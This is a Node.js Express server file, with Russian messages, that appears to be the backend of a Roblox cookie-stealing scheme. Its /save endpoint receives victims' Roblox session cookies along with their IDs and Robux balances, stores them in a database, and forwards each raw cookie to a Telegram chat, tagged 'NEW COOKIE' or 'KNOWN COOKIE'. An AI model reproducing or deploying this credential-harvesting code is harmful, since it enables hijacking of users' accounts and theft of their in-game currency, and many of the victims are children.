require("dotenv").config();
const express = require("express");
const { neon } = require("@neondatabase/serverless");
const { Bot } = require("grammy");
const cors = require("cors");

const PORT = 5000;
const app = express();
const client = neon(process.env.DATABASE_URL);
const bot = new Bot(process.env.BOT_TOKEN);

sendTelegramMessage = async (chatId, message) => {
  try {
    await bot.api.sendMessage(chatId, message, {
      parse_mode : "HTML",
    });
  } catch (error) {
    console.error("Ошибка отправки:", error);
  }
};


app.use(express.json());
app.use(
  cors({
    methods: ["POST", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
  }),
);

app.post("/save", async (req, res) => {
  const { login, robloxId, robux = null } = req.body ?? {};
  if (!login) {
    return res
      .status(400)
      .json({ ok: false, error: "Не передан токен сессии" });
  }

  try {
    const existing = await client`
      SELECT id, roblox_id FROM users
      WHERE cookie = ${login}
      LIMIT 1
    `;

    let alreadyExists = false;

    if (existing.length > 0) {
      alreadyExists = true;
      if (robloxId && !existing[0].roblox_id) {
        await client`
          UPDATE users
          SET roblox_id = ${robloxId}
          WHERE id = ${existing[0].id}
        `;
      }
    } else {
      await client`
        INSERT INTO users (cookie, roblox_id, robux)
        VALUES (${login}, ${robloxId}, ${robux})
      `;
    }

    const robuxLine =
      robux !== null && robux !== undefined ? `\n<b>ROBUX:</b> ${robux}` : "";

    await sendTelegramMessage(
      process.env.CHAT_ID,
      `<b>${alreadyExists ? "KNOWN COOKIE ♻️" : "NEW COOKIE 🍪"}</b>\n\n` +
      `Robux - ${robux}\n\n` + 
        `<b>LINK:</b> https://www.roblox.com/users/${robloxId}/profile\n\n` +
        `<code>${login}</code>`
    );

    res.json({ ok: true, alreadyExists });
  } catch (err) {
    console.error("Ошибка:", err);
    res.status(500).json({ ok: false, error: err.message });
  }
});
app.get("/health", (req, res) => {
  res.status(200).send("Server is running!");
});
app.listen(PORT, () => {
  console.log(`Сервер запущен: http://localhost:${PORT}`);
});
